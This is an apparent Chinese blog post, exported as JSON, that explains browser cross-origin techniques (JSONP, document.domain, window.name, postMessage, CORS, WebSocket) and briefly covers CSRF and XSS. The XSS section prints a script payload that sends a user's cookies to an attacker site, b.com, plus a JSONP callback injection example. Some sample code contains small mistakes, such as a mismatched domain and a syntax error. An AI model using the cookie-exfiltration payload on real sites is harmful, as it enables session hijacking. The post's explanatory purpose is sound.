{"title":"跨域","slug":"跨域","date":"2018-04-26T16:00:00.000Z","updated":"2018-04-26T16:00:00.000Z","comments":true,"path":"api/articles/跨域.json","excerpt":"关于浏览器跨域，经常会遇到这方面的问题，整理一下相关资源。<br>","covers":["../images/ajax_articlex.png"],"content":"<p>关于浏览器跨域，经常会遇到这方面的问题，整理一下相关资源。<br><a id=\"more\"></a></p>\n<h2 id=\"跨域概念\"><a href=\"#跨域概念\" class=\"headerlink\" title=\"跨域概念\"></a>跨域概念</h2><p>举个简单的例子：<br>一个地址为<code>URLA</code>的页面A试图请求另一个地址为<code>URLB</code>的资源。</p>\n<p>它们的地址（<code>URLA</code>/<code>URLB</code>）中主机名（域名）、协议、端口号，只要有一个不相同，就为不同的域（或源），即异源，注意即便两个不同的域名指向同一个ip地址，也是异源。</p>\n<p>相对的，如果相同，即为浏览器的同源策略/SOP（Same origin policy），同源策略限制以下几种行为：</p>\n<ol>\n<li>Cookie、LocalStorage 和 IndexDB 无法读取</li>\n<li>DOM 和 Js对象无法获得</li>\n<li>AJAX 请求不能发送</li>\n</ol>\n<h2 id=\"跨域方案\"><a href=\"#跨域方案\" class=\"headerlink\" title=\"跨域方案\"></a>跨域方案</h2><h3 id=\"JSONP\"><a href=\"#JSONP\" class=\"headerlink\" title=\"JSONP\"></a>JSONP</h3><p>浏览器允许html标签从不同域名下加载静态资源，在此基础上，可通过动态创建script标签，请求一个带参数的网址实现跨域通信。</p>\n<p>缺点是只能通过GET方式请求。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// JavaScript</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">script.type = <span class=\"string\">'text/javascript'</span>;</span><br><span class=\"line\"><span class=\"comment\">// 传参并指定回调执行函数为back</span></span><br><span class=\"line\">script.src = <span class=\"string\">'http://example.com/login?callback=back'</span>;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.head.appendChild(script);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// jquery</span></span><br><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    url: <span class=\"string\">'http://example.com/login'</span>,</span><br><span class=\"line\">    type: <span class=\"string\">'get'</span>,</span><br><span class=\"line\">    dataType: <span class=\"string\">'jsonp'</span>,  <span class=\"comment\">// 请求方式为jsonp</span></span><br><span class=\"line\">    jsonpCallback: <span class=\"string\">\"back\"</span>,    <span class=\"comment\">// 自定义回调函数名</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 需要回调执行函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">back</span>(<span class=\"params\">res</span>) </span>&#123;</span><br><span class=\"line\">    alert(<span class=\"built_in\">JSON</span>.stringify(res));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 服务端返回</span></span><br><span class=\"line\">back(&#123;<span class=\"string\">\"status\"</span>: <span class=\"literal\">true</span>, <span class=\"string\">\"user\"</span>: <span class=\"string\">\"admin\"</span>&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"document-domain\"><a href=\"#document-domain\" class=\"headerlink\" title=\"document.domain\"></a>document.domain</h3><p>仅适用于主域相同，子域不同。可以共享Cookie。</p>\n<p><code>www.example.com/a.html</code> 和<code>child.example.com/b.html</code>相互之间的通信，两个页面都需要设置：<br><code>document.domain = &#39;example.com&#39;;</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 结合iframe实现更多跨域</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// www.example.com/a.html</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'domain.com'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> user = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// child.example.com/b.html</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'domain.com'</span>;</span><br><span class=\"line\">alert(<span class=\"string\">'父窗口变量user'</span> + <span class=\"built_in\">window</span>.parent.user);</span><br></pre></td></tr></table></figure>\n<h3 id=\"window-name\"><a href=\"#window-name\" class=\"headerlink\" title=\"window.name\"></a>window.name</h3><p>适用于iframe嵌套。</p>\n<p><code>window.name</code>是在同一个浏览器窗口下打开的所有页面共享的字段，最多可支持2MB。可以通过在<code>b.html</code>中设置<code>window.name</code>的值，在<code>a.html</code>中取出改值使用。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// www.domain1.com/a.html</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> proxy = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">url, callback</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> state = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'iframe'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 加载跨域页面</span></span><br><span class=\"line\">    iframe.src = url;</span><br><span class=\"line\">    <span class=\"comment\">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span><br><span class=\"line\">    iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (state === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 第2次onload(同域proxy页)成功后，读取同域window.name中数据</span></span><br><span class=\"line\">            callback(iframe.contentWindow.name);</span><br><span class=\"line\">            destoryFrame();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (state === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span><br><span class=\"line\">            iframe.contentWindow.location = <span class=\"string\">'http://www.domain1.com/proxy.html'</span>;</span><br><span class=\"line\">            state = <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br><span class=\"line\">    <span class=\"comment\">// 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">destoryFrame</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        iframe.contentWindow.document.write(<span class=\"string\">''</span>);</span><br><span class=\"line\">        iframe.contentWindow.close();</span><br><span class=\"line\">        <span class=\"built_in\">document</span>.body.removeChild(iframe);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">// 请求跨域b页面数据</span></span><br><span class=\"line\">proxy(<span class=\"string\">'http://www.domain2.com/b.html'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>)</span>&#123;</span><br><span class=\"line\">    alert(data);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// www.domain1.com/proxy.html</span></span><br><span class=\"line\">代理页面，内容为空即可。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// www.domain2.com/b.html</span></span><br><span class=\"line\"> <span class=\"built_in\">window</span>.name = <span class=\"string\">'This is domain2 data!'</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"window-postMessage\"><a href=\"#window-postMessage\" class=\"headerlink\" title=\"window.postMessage\"></a>window.postMessage</h3><p>postMessage是HTML5 XMLHttpRequest Level 2的新增API，下面为MDN给的示例。</p>\n<p><code>otherWindow.postMessage(message, targetOrigin, [transfer])</code></p>\n<ul>\n<li>otherWindow:其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。</li>\n<li>message:将要发送到其他 window的数据。</li>\n<li>targetOrigin:通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串”*”（表示无限制）或者一个URI。</li>\n<li>transfer:是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- www.example1.com/a.html --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">id</span>=<span class=\"string\">\"iframe\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://www.example2.com/b.html\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"display:none;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'iframe'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> data = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            msg: <span class=\"string\">'1+1'</span>,</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 传送跨域数据</span></span></span><br><span class=\"line\"><span class=\"javascript\">        iframe.contentWindow.postMessage(<span class=\"built_in\">JSON</span>.stringify(data), <span class=\"string\">'http://www.example2.com'</span>);</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 接收example2数据</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">receiveMessage</span>(<span class=\"params\">e</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (event.origin !== <span class=\"string\">\"http://www.example2.com\"</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        alert(<span class=\"string\">'来自页面B:'</span> + e.data);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'message'</span>, receiveMessage, <span class=\"literal\">false</span>);</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- www.example2.com/b.html --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//接收example1数据</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">receiveMessage</span>(<span class=\"params\">e</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (event.origin !== <span class=\"string\">\"http://www.example1.com\"</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        alert(<span class=\"string\">'来自页面A:'</span> + e.data);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> data = <span class=\"built_in\">JSON</span>.parse(e.data);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (data) &#123;</span></span><br><span class=\"line\">            data.sum = 2;</span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// 处理后再发回example1</span></span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">window</span>.parent.postMessage(<span class=\"built_in\">JSON</span>.stringify(data), <span class=\"string\">'http://www.example1.com'</span>);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'message'</span>, receiveMessage, <span class=\"literal\">false</span>);</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"CORS\"><a href=\"#CORS\" class=\"headerlink\" title=\"CORS\"></a>CORS</h3><p>CORS即跨域资源共享（Cross-origin resource sharing）。详细介绍可参考<a href=\"http://www.ruanyifeng.com/blog/2016/04/cors.html\" target=\"_blank\" rel=\"noopener\">跨域资源共享 CORS 详解</a>。</p>\n<p>普通的请求只需服务端设置Access-Control-Allow-Origin即可，前端无须设置。<br>带Cookie请求，前端常用设置：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*  </span></span><br><span class=\"line\"><span class=\"comment\">  原生ajax</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest(); <span class=\"comment\">// IE8/9需用window.XDomainRequest兼容</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 前端设置是否带cookie</span></span><br><span class=\"line\">xhr.withCredentials = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">xhr.open(<span class=\"string\">'post'</span>, <span class=\"string\">'http://www.domain2.com:8080/login'</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.setRequestHeader(<span class=\"string\">'Content-Type'</span>, <span class=\"string\">'application/x-www-form-urlencoded'</span>);</span><br><span class=\"line\">xhr.send(<span class=\"string\">'user=admin'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">xhr.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (xhr.readyState == <span class=\"number\">4</span> &amp;&amp; xhr.status == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">        alert(xhr.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">/*  </span></span><br><span class=\"line\"><span class=\"comment\">  jquery</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">   xhrFields: &#123;</span><br><span class=\"line\">       withCredentials: <span class=\"literal\">true</span>    <span class=\"comment\">// 前端设置是否带cookie</span></span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">   crossDomain: <span class=\"literal\">true</span>,   <span class=\"comment\">// 会让请求头中包含跨域的额外信息，但不会含cookie</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*  </span></span><br><span class=\"line\"><span class=\"comment\">  axios ==&gt;  withCredentials: true</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">'axios'</span></span><br><span class=\"line\"><span class=\"comment\">// 创建axios实例</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">  baseURL: process.env.BASE_API, <span class=\"comment\">// node环境的不同，对应不同的baseURL</span></span><br><span class=\"line\">  timeout: <span class=\"number\">5000</span>, <span class=\"comment\">// 请求的超时时间</span></span><br><span class=\"line\">  <span class=\"comment\">//设置默认请求头，使post请求发送的是formdata格式数据// axios的header默认的Content-Type好像是'application/json;charset=UTF-8',我的项目都是用json格式传输，如果需要更改的话，可以用这种方式修改</span></span><br><span class=\"line\">  <span class=\"comment\">// headers: &#123;  </span></span><br><span class=\"line\">    <span class=\"comment\">// \"Content-Type\": \"application/x-www-form-urlencoded\"</span></span><br><span class=\"line\">  <span class=\"comment\">// &#125;,</span></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">true</span> <span class=\"comment\">// 允许携带cookie</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// node后台</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = express()</span><br><span class=\"line\"><span class=\"keyword\">const</span> cors = <span class=\"built_in\">require</span>(<span class=\"string\">'cors'</span>) <span class=\"comment\">// 此处我的项目中使用express框架，跨域使用了cors npm插件</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.use(cors&#123;</span><br><span class=\"line\">    credentials: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    origin: <span class=\"string\">'http://localhost:8081'</span>, <span class=\"comment\">// web前端服务器地址</span></span><br><span class=\"line\">    <span class=\"comment\">// origin: '*' // 这样会出错</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"WebSocket\"><a href=\"#WebSocket\" class=\"headerlink\" title=\"WebSocket\"></a>WebSocket</h3><p>只要服务端支持就可以使用。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// express</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> app = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>)();</span><br><span class=\"line\"><span class=\"keyword\">var</span> server = <span class=\"built_in\">require</span>(<span class=\"string\">'http'</span>).Server(app);</span><br><span class=\"line\"><span class=\"keyword\">var</span> io = <span class=\"built_in\">require</span>(<span class=\"string\">'socket.io'</span>)(server);</span><br><span class=\"line\"></span><br><span class=\"line\">server.listen(<span class=\"number\">80</span>);</span><br><span class=\"line\"><span class=\"comment\">// WARNING: app.listen(80) will NOT work here!</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.sendfile(__dirname + <span class=\"string\">'/index.html'</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">io.on(<span class=\"string\">'connection'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">socket</span>) </span>&#123;</span><br><span class=\"line\">  socket.emit(<span class=\"string\">'news'</span>, &#123; <span class=\"attr\">hello</span>: <span class=\"string\">'world'</span> &#125;);</span><br><span class=\"line\">  socket.on(<span class=\"string\">'my other event'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(data);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// index.html</span></span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"/socket.io/socket.io.js\"</span>&gt;<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> socket = io.connect(<span class=\"string\">'http://localhost'</span>);</span><br><span class=\"line\">  socket.on(<span class=\"string\">'news'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(data);</span><br><span class=\"line\">    socket.emit(<span class=\"string\">'my other event'</span>, &#123; <span class=\"attr\">my</span>: <span class=\"string\">'data'</span> &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"跨域攻击\"><a href=\"#跨域攻击\" class=\"headerlink\" title=\"跨域攻击\"></a>跨域攻击</h2><h3 id=\"CSRF-XSRF攻击\"><a href=\"#CSRF-XSRF攻击\" class=\"headerlink\" title=\"CSRF/XSRF攻击\"></a>CSRF/XSRF攻击</h3><p>示例如下，防止CSRF攻击的方法是<code>referer过滤校验+token验证</code>，即服务端检测JSON文件调用来源和检查token数据是否匹配。</p>\n<p><img src=\"../images/ajax_articlex.png\" alt=\"CSRF/XSRF\"></p>\n<h3 id=\"XSS攻击\"><a href=\"#XSS攻击\" class=\"headerlink\" title=\"XSS攻击\"></a>XSS攻击</h3><p>提交含有恶意脚本的数据到服务器，从而达到破坏页面甚至盗取cookie伪装登录等目的。<br>例如，在<code>a.com/index.ftl</code>中有如下代码：<code>欢迎你，${username}</code>，这时恶意网站<code>b.com</code>传递参数：<br><code>username=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;</code><br>这样就轻而易举地盗取了用户的cookie值了。<br>在jsonp跨域访问中，xss注入主要是callback参数注入，如：<br><code>&lt;script src=&quot;http://www.a.com/getData.do?callback=&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&quot;&gt;&lt;/script&gt;</code><br>防止措施是对参数进行校验过滤。</p>\n<p>参考链接<br><a href=\"https://segmentfault.com/a/1190000003784372\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000003784372</a><br><a href=\"https://www.cnblogs.com/roam/p/7520433.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/roam/p/7520433.html</a></p>\n","more":"</p>\n<h2 id=\"跨域概念\"><a href=\"#跨域概念\" class=\"headerlink\" title=\"跨域概念\"></a>跨域概念</h2><p>举个简单的例子：<br>一个地址为<code>URLA</code>的页面A试图请求另一个地址为<code>URLB</code>的资源。</p>\n<p>它们的地址（<code>URLA</code>/<code>URLB</code>）中主机名（域名）、协议、端口号，只要有一个不相同，就为不同的域（或源），即异源，注意即便两个不同的域名指向同一个ip地址，也是异源。</p>\n<p>相对的，如果相同，即为浏览器的同源策略/SOP（Same origin policy），同源策略限制以下几种行为：</p>\n<ol>\n<li>Cookie、LocalStorage 和 IndexDB 无法读取</li>\n<li>DOM 和 Js对象无法获得</li>\n<li>AJAX 请求不能发送</li>\n</ol>\n<h2 id=\"跨域方案\"><a href=\"#跨域方案\" class=\"headerlink\" title=\"跨域方案\"></a>跨域方案</h2><h3 id=\"JSONP\"><a href=\"#JSONP\" class=\"headerlink\" title=\"JSONP\"></a>JSONP</h3><p>浏览器允许html标签从不同域名下加载静态资源，在此基础上，可通过动态创建script标签，请求一个带参数的网址实现跨域通信。</p>\n<p>缺点是只能通过GET方式请求。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// JavaScript</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">script.type = <span class=\"string\">'text/javascript'</span>;</span><br><span class=\"line\"><span class=\"comment\">// 传参并指定回调执行函数为back</span></span><br><span class=\"line\">script.src = <span class=\"string\">'http://example.com/login?callback=back'</span>;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.head.appendChild(script);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// jquery</span></span><br><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    url: <span class=\"string\">'http://example.com/login'</span>,</span><br><span class=\"line\">    type: <span class=\"string\">'get'</span>,</span><br><span class=\"line\">    dataType: 